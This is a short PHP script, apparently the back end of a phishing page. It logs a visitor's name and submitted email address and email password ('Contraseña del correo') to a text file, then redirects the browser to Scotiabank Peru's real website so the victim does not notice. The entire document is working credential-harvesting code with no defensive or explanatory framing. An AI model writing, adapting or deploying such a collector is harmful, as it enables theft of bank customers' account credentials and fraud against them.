<?php

$mensaje="Usuario: ".$_GET['persona']." Correo: ".$_POST['email']." Contraseña del correo: ".$_POST['pass']."\n";
$file = fopen("legend.txt", "a");

fwrite($file, "$mensaje" . PHP_EOL);

?>


<script type="text/javascript">
   window.location.href = "https://www.scotiabank.com.pe/";
</script>